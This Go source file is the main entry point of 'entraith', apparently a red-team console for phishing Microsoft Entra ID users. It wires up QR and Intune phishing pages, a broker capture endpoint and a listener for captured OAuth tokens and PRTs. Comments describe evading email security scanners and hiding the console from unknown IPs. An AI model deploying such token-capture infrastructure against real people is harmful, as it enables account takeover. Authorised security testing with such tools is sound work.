package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/bl4cksku11/entraith/internal/api"
	"github.com/bl4cksku11/entraith/internal/auth"
	"github.com/bl4cksku11/entraith/internal/campaigns"
	"github.com/bl4cksku11/entraith/internal/config"
	"github.com/bl4cksku11/entraith/internal/mailer"
	"github.com/bl4cksku11/entraith/internal/store"
	"github.com/bl4cksku11/entraith/internal/web"
)

// pageGuard validates the session cookie server-side before serving a protected
// HTML page. If the cookie is missing, invalid, or expired the browser is
// redirected to /login with a ?next= parameter so the user lands back on the
// right page after authenticating.
func pageGuard(db *store.Store, html string, secureCookies bool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session")
		if err != nil || cookie.Value == "" {
			redirectToLogin(w, r)
			return
		}
		sess, err := db.GetSession(cookie.Value)
		if err != nil || sess == nil || time.Now().After(sess.ExpiresAt) {
			// Expired or unknown session — clear the stale cookie
			http.SetCookie(w, &http.Cookie{
				Name:     "session",
				Value:    "",
				Path:     "/",
				MaxAge:   -1,
				HttpOnly: true,
				Secure:   secureCookies,
				SameSite: http.SameSiteStrictMode,
			})
			redirectToLogin(w, r)
			return
		}
		setConsoleHeaders(w)
		w.Write([]byte(html))
	}
}

// setConsoleHeaders applies the operator-console security headers (CSP, anti
// clickjacking, no-cache). Used only for authenticated pages and the login
// page — never for the target-facing /qr and /intune landing pages.
func setConsoleHeaders(w http.ResponseWriter) {
	h := w.Header()
	h.Set("Content-Type", "text/html; charset=utf-8")
	// style-src/font-src permit Google Fonts (JetBrains Mono @import). The Dark
	// SOC restyle moves to self-hosted fonts; tighten these back to 'self' then.
	h.Set("Content-Security-Policy",
		"default-src 'self'; script-src 'self' 'unsafe-inline'; "+
			"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "+
			"img-src 'self' data:; font-src 'self' data: https://fonts.gstatic.com; "+
			"connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'")
	h.Set("X-Frame-Options", "DENY")
	h.Set("X-Content-Type-Options", "nosniff")
	h.Set("Referrer-Policy", "no-referrer")
	h.Set("Cache-Control", "no-store, no-cache, must-revalidate")
	h.Set("Pragma", "no-cache")
}

// consoleAllowlist restricts the operator console (login, dashboard, API,
// webhook controls) to a set of source IPs/CIDRs. Target-facing endpoints
// (/qr, /intune, /receive, /capture) are always reachable so phishing and
// beacon callbacks still work from arbitrary client IPs. An empty allowlist
// disables the restriction.
func consoleAllowlist(cidrs []string, next http.Handler) http.Handler {
	if len(cidrs) == 0 {
		return next
	}
	var nets []*net.IPNet
	var ips []net.IP
	for _, c := range cidrs {
		if _, n, err := net.ParseCIDR(c); err == nil {
			nets = append(nets, n)
			continue
		}
		if ip := net.ParseIP(c); ip != nil {
			ips = append(ips, ip)
		}
	}
	isPublicPath := func(p string) bool {
		return strings.HasPrefix(p, "/qr/") || strings.HasPrefix(p, "/intune/") ||
			p == "/intune/capture" || p == "/receive" || p == "/capture"
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if isPublicPath(r.URL.Path) {
			next.ServeHTTP(w, r)
			return
		}
		ip := net.ParseIP(api.ClientIP(r))
		allowed := false
		for _, n := range nets {
			if ip != nil && n.Contains(ip) {
				allowed = true
				break
			}
		}
		if !allowed {
			for _, a := range ips {
				if a.Equal(ip) {
					allowed = true
					break
				}
			}
		}
		if !allowed {
			// Look like nothing is here rather than confirming a console exists.
			http.NotFound(w, r)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// resolveEncryptionKey returns the at-rest encryption key material. Preference:
//  1. an operator-supplied auth.secret_key from config (any length);
//  2. otherwise a persistent random key auto-generated at <dataPath>/.entraith.key
//     (mode 0600) so encryption is always on without manual setup.
func resolveEncryptionKey(configured, dataPath string) ([]byte, error) {
	if strings.TrimSpace(configured) != "" {
		return []byte(configured), nil
	}
	keyPath := filepath.Join(dataPath, ".entraith.key")
	if b, err := os.ReadFile(keyPath); err == nil && len(b) > 0 {
		return b, nil
	}
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	enc := []byte(hex.EncodeToString(key))
	if err := os.WriteFile(keyPath, enc, 0600); err != nil {
		return nil, fmt.Errorf("writing key file %s: %w", keyPath, err)
	}
	log.Printf("Generated at-rest encryption key: %s (mode 0600) — back this up to keep DB readable", keyPath)
	return enc, nil
}

func redirectToLogin(w http.ResponseWriter, r *http.Request) {
	target := "/login?next=" + url.QueryEscape(r.URL.RequestURI())
	http.Redirect(w, r, target, http.StatusFound)
}

func usage() {
	fmt.Fprintf(os.Stderr, "Usage:\n")
	fmt.Fprintf(os.Stderr, "  entraith server   <config> [--debug]  start the operator console\n")
	fmt.Fprintf(os.Stderr, "  entraith validate <config>          validate config file\n")
	fmt.Fprintf(os.Stderr, "  entraith version                    print version\n")
	fmt.Fprintf(os.Stderr, "\nFlags (alternative to positional config):\n")
	fmt.Fprintf(os.Stderr, "  --config <path>                     path to engagement config file\n")
}

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "server":
		runServer()
	case "validate":
		runValidate()
	case "reset-admin":
		runResetAdmin()
	case "version":
		fmt.Println("entraith v0.2.0")
	default:
		usage()
		os.Exit(1)
	}
}

func subArgs() []string {
	if len(os.Args) > 2 {
		return os.Args[2:]
	}
	return nil
}

// resolveConfig returns the config path from --config flag or first positional arg.
// Returns "" if neither was provided.
func resolveConfig(fs *flag.FlagSet, cfgPath *string) string {
	if *cfgPath != "" {
		return *cfgPath
	}
	if args := fs.Args(); len(args) > 0 {
		return args[0]
	}
	return ""
}

func runServer() {
	// Pre-scan for --debug/-debug anywhere in the arg list before standard flag
	// parsing, because Go's flag package stops at the first non-flag argument
	// (the positional config path), which would cause --debug placed after it
	// to be silently ignored.
	debugMode := false
	filteredArgs := make([]string, 0, len(subArgs()))
	for _, a := range subArgs() {
		if a == "--debug" || a == "-debug" {
			debugMode = true
		} else {
			filteredArgs = append(filteredArgs, a)
		}
	}

	fs := flag.NewFlagSet("server", flag.ExitOnError)
	cfgPath := fs.String("config", "", "path to engagement config file")
	fs.Parse(filteredArgs)
	resolvedCfg := resolveConfig(fs, cfgPath)
	if resolvedCfg == "" {
		fmt.Fprintf(os.Stderr, "error: config file required\n")
		fmt.Fprintf(os.Stderr, "usage: entraith server <config>\n")
		os.Exit(1)
	}

	cfg, err := config.Load(resolvedCfg)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Ensure storage directories exist
	dataPath := filepath.Dir(cfg.Storage.ArtifactsPath)
	os.MkdirAll(dataPath, 0700)
	os.MkdirAll(cfg.Storage.ArtifactsPath, 0700)
	os.MkdirAll(cfg.Storage.ExportsPath, 0700)

	// Open SQLite database
	dbPath := filepath.Join(dataPath, "entraith.db")
	db, err := store.New(dbPath)
	if err != nil {
		log.Fatalf("Failed to open database: %v", err)
	}
	defer db.Close()

	// Enable encryption-at-rest for secret columns BEFORE loading any state, so
	// SMTP passwords, captured tokens and PRTs are decrypted on the way in.
	encKey, err := resolveEncryptionKey(cfg.Auth.SecretKey, dataPath)
	if err != nil {
		log.Fatalf("Failed to resolve encryption key: %v", err)
	}
	if err := db.SetEncryptionKey(encKey); err != nil {
		log.Fatalf("Failed to enable encryption-at-rest: %v", err)
	}

	// Generate admin user on first run
	if count, err := db.CountUsers(); err == nil && count == 0 {
		password := auth.GeneratePassword(16)
		hash := auth.HashPassword(password)
		if err := db.CreateUser("user-admin", "admin", hash, ""); err != nil {
			log.Fatalf("Failed to create admin user: %v", err)
		}
		log.Printf("╔══════════════════════════════════════════════╗")
		log.Printf("║      FIRST RUN — ADMIN CREDENTIALS           ║")
		log.Printf("║  Username : admin                            ║")
		log.Printf("║  Password : %-32s ║", password)
		log.Printf("╚══════════════════════════════════════════════╝")
	}

	// Build mailer manager and wire persistence
	mailMgr := mailer.NewManager()
	mailMgr.SetPersistence(
		func(p *mailer.SenderProfile) {
			db.UpsertSenderProfile(store.SenderProfileRow{
				ID:          p.ID,
				Name:        p.Name,
				Host:        p.Host,
				Port:        p.Port,
				Username:    p.Username,
				Password:    p.Password,
				FromAddress: p.FromAddress,
				FromName:    p.FromName,
				ImplicitTLS: p.ImplicitTLS,
				AuthMethod:  p.AuthMethod,
				CreatedAt:   p.CreatedAt,
				OwnerID:     p.OwnerID,
			})
		},
		func(id string) { db.DeleteSenderProfile(id) },
		func(t *mailer.EmailTemplate) {
			db.UpsertEmailTemplate(store.EmailTemplateRow{
				ID:            t.ID,
				Name:          t.Name,
				Subject:       t.Subject,
				HTMLBody:      t.HTMLBody,
				TextBody:      t.TextBody,
				RedirectorURL: t.RedirectorURL,
				CreatedAt:     t.CreatedAt,
			})
		},
		func(id string) { db.DeleteEmailTemplate(id) },
	)

	// Load mailer state from database
	profileRows, err := db.LoadSenderProfiles()
	if err != nil {
		log.Fatalf("Failed to load sender profiles: %v", err)
	}
	profiles := make([]mailer.SenderProfile, len(profileRows))
	for i, r := range profileRows {
		profiles[i] = mailer.SenderProfile{
			ID: r.ID, Name: r.Name, Host: r.Host, Port: r.Port,
			Username: r.Username, Password: r.Password,
			FromAddress: r.FromAddress, FromName: r.FromName,
			ImplicitTLS: r.ImplicitTLS, AuthMethod: r.AuthMethod,
			CreatedAt: r.CreatedAt, OwnerID: r.OwnerID,
		}
	}
	mailMgr.LoadProfiles(profiles)

	templateRows, err := db.LoadEmailTemplates()
	if err != nil {
		log.Fatalf("Failed to load email templates: %v", err)
	}
	templates := make([]mailer.EmailTemplate, len(templateRows))
	for i, r := range templateRows {
		templates[i] = mailer.EmailTemplate{
			ID: r.ID, Name: r.Name, Subject: r.Subject,
			HTMLBody: r.HTMLBody, TextBody: r.TextBody,
			RedirectorURL: r.RedirectorURL, CreatedAt: r.CreatedAt,
		}
	}
	mailMgr.LoadTemplates(templates)

	// Build campaign manager and restore persisted state
	if debugMode {
		log.Printf("[DEBUG] mode enabled — request/response bodies will be logged")
	}

	mgr := campaigns.NewManager(
		cfg.Campaign.TenantID,
		cfg.Campaign.ClientID,
		cfg.Campaign.Scope,
		cfg.Campaign.PollInterval,
		cfg.Campaign.CaptureV1,
		cfg.Campaign.RequireMFA,
		debugMode,
		cfg.Storage.ArtifactsPath,
		cfg.Storage.ExportsPath,
		db,
	)
	if err := mgr.Load(); err != nil {
		log.Fatalf("Failed to load campaign state: %v", err)
	}

	// Build API handler
	webhookLogPath := filepath.Join(cfg.Storage.ArtifactsPath, "stream_monitor.log")
	apiHandler := api.NewHandler(mgr, mailMgr, webhookLogPath, db)
	apiHandler.SecureCookies = cfg.Server.SecureCookies

	// Token listener — standalone intake server for out-of-band captured tokens
	// (AiTM proxy / phishing page / manual drop). Controlled at runtime via
	// /api/token-listener/{start,stop,status,logs}, or autostarted here.
	tokenLogPath := filepath.Join(cfg.Storage.ArtifactsPath, "token_listener.log")
	apiHandler.TokenListener = api.NewTokenListener(mgr, tokenLogPath, cfg.Listener.DefaultCampaign)
	apiHandler.TokenListener.DefaultPort = cfg.Listener.TokenPort
	if cfg.Listener.TokenAutostart {
		if err := apiHandler.TokenListener.Start(cfg.Listener.TokenPort); err != nil {
			log.Printf("[token-listener] autostart failed: %v", err)
		}
	}

	// Main router
	mux := http.NewServeMux()

	// Login page — public, no session required
	mux.HandleFunc("GET /login", func(w http.ResponseWriter, r *http.Request) {
		setConsoleHeaders(w)
		w.Write([]byte(web.LoginHTML))
	})

	// Protected pages — server-side session guard redirects to /login if unauthenticated
	mux.HandleFunc("/", pageGuard(db, web.DashboardHTML, cfg.Server.SecureCookies))
	mux.HandleFunc("GET /tools", pageGuard(db, web.ToolsHTML, cfg.Server.SecureCookies))
	mux.HandleFunc("GET /infra", pageGuard(db, web.InfraHTML, cfg.Server.SecureCookies))

	// API + webhook routes — single handler instance shared across all three prefixes.
	routes := apiHandler.Routes()
	mux.Handle("/api/", routes)
	mux.Handle("/webhook/", routes)

	// QR phishing — two-phase flow to defeat email security scanners.
	// GET  serves an inert JS page; POST /confirm is the real trigger.
	qrGet, qrConfirm := apiHandler.QRScanHandler()
	mux.HandleFunc("GET /qr/{token}", qrGet)
	mux.HandleFunc("POST /qr/{token}/confirm", qrConfirm)

	// Intune phishing — single-page OAuth login with ms-appx-web:// capture
	mux.HandleFunc("GET /intune/{token}", apiHandler.HandleIntuneLanding())

	// Webhook / telemetry receiver
	mux.Handle("/receive", routes)

	// Native Broker Interop — public endpoint for URI capture
	mux.HandleFunc("POST /capture", apiHandler.CaptureBroker())

	// Intune capture — public endpoint for ms-appx-web:// capture from landing page
	mux.HandleFunc("POST /intune/capture", apiHandler.CaptureIntune)

	// Health check — generic, unauthenticated. Deliberately leaks no
	// engagement/operator/client identifiers (it is reachable by anyone who
	// finds the host). Detailed status lives behind the authenticated API.
	mux.HandleFunc("GET /health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Cache-Control", "no-store")
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	// Wrap the whole router in the console IP allowlist (no-op if unset).
	handler := consoleAllowlist(cfg.Server.IPAllowlist, mux)

	addr := fmt.Sprintf("%s:%d", cfg.Server.Host, cfg.Server.Port)
	log.Printf("╔════════════════════════════════════════╗")
	log.Printf("║          ENTRAITH Operator Tool        ║")
	log.Printf("╚════════════════════════════════════════╝")
	log.Printf("Engagement : %s", cfg.Engagement.ID)
	log.Printf("Operator   : %s", cfg.Engagement.Operator)
	log.Printf("Tenant     : %s", cfg.Campaign.TenantID)
	log.Printf("Client ID  : %s", cfg.Campaign.ClientID)
	log.Printf("Database   : %s", dbPath)
	scheme := "http"
	if cfg.Server.TLS {
		scheme = "https"
	}
	log.Printf("Listening  : %s://%s", scheme, addr)
	if len(cfg.Server.IPAllowlist) > 0 {
		log.Printf("Allowlist  : console restricted to %s", strings.Join(cfg.Server.IPAllowlist, ", "))
	}
	log.Printf("Webhook    : POST %s://%s/receive  → %s", scheme, addr, webhookLogPath)
	if cfg.Listener.TokenAutostart {
		log.Printf("Token intake: POST http://%s:%d/token  → ingest into campaign (autostarted)", cfg.Server.Host, cfg.Listener.TokenPort)
	} else {
		log.Printf("Token intake: stopped — start with POST /api/token-listener/start (default port %d)", cfg.Listener.TokenPort)
	}

	srv := &http.Server{
		Addr:              addr,
		Handler:           handler,
		ReadHeaderTimeout: 15 * time.Second,
	}
	if cfg.Server.TLS {
		if cfg.Server.CertFile == "" || cfg.Server.KeyFile == "" {
			log.Fatalf("server.tls is true but server.cert_file / server.key_file are not set")
		}
		if err := srv.ListenAndServeTLS(cfg.Server.CertFile, cfg.Server.KeyFile); err != nil {
			log.Fatalf("Server error: %v", err)
		}
		return
	}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}

func runValidate() {
	fs := flag.NewFlagSet("validate", flag.ExitOnError)
	cfgPath := fs.String("config", "", "path to config")
	fs.Parse(subArgs())
	resolvedCfg := resolveConfig(fs, cfgPath)
	if resolvedCfg == "" {
		fmt.Fprintf(os.Stderr, "error: config file required\n")
		fmt.Fprintf(os.Stderr, "usage: entraith validate <config>\n")
		os.Exit(1)
	}

	cfg, err := config.Load(resolvedCfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Config validation passed:")
	fmt.Printf("  Engagement ID : %s\n", cfg.Engagement.ID)
	fmt.Printf("  Client Code   : %s\n", cfg.Engagement.ClientCode)
	fmt.Printf("  Tenant ID     : %s\n", cfg.Campaign.TenantID)
	fmt.Printf("  Client ID     : %s\n", cfg.Campaign.ClientID)
	fmt.Printf("  Scope         : %s\n", cfg.Campaign.Scope)
	fmt.Printf("  Poll Interval : %ds\n", cfg.Campaign.PollInterval)
	fmt.Printf("  Artifacts     : %s\n", cfg.Storage.ArtifactsPath)
}

func runResetAdmin() {
	fs := flag.NewFlagSet("reset-admin", flag.ExitOnError)
	cfgPath := fs.String("config", "", "path to config")
	fs.Parse(subArgs())
	resolvedCfg := resolveConfig(fs, cfgPath)
	if resolvedCfg == "" {
		fmt.Fprintf(os.Stderr, "error: config file required\n")
		fmt.Fprintf(os.Stderr, "usage: entraith reset-admin <config>\n")
		os.Exit(1)
	}

	cfg, err := config.Load(resolvedCfg)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	dataPath := filepath.Dir(cfg.Storage.ArtifactsPath)
	dbPath := filepath.Join(dataPath, "entraith.db")
	db, err := store.New(dbPath)
	if err != nil {
		log.Fatalf("Failed to open database: %v", err)
	}
	defer db.Close()

	user, err := db.GetUserByUsername("admin")
	if err != nil || user == nil {
		log.Fatalf("Admin user not found — run 'entraith server' first to create it")
	}

	newPassword := auth.GeneratePassword(16)
	newHash := auth.HashPassword(newPassword)

	if err := db.UpdateUserPassword("admin", newHash, ""); err != nil {
		log.Fatalf("Failed to reset password: %v", err)
	}

	log.Printf("╔══════════════════════════════════════════════╗")
	log.Printf("║         ADMIN PASSWORD RESET                ║")
	log.Printf("║  Username : admin                            ║")
	log.Printf("║  Password : %-32s ║", newPassword)
	log.Printf("╚══════════════════════════════════════════════╝")
}
